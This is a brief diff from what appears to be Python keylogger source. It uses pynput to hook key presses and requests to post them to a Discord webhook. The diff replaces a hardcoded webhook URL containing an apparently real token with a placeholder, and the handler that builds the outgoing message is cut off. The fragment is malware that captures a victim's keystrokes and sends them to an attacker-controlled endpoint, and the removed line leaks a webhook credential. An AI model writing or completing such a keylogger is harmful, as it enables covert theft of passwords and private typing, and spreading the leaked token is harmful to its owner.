@@ -1,7 +1,7 @@
 from pynput import keyboard
 import requests
 
-webhook = "https://discordapp.com/api/webhooks/1348134373953765460/jzE3SW25lFsWZjo2AUioUptkndQ7EA2eBC9yvdrh5L2Sdd_-lMmSIi7P9Xq5qF8Z5ZXF"
+webhook = "yourwebhookhere"
 
 def keyPressed(key):
     message = {
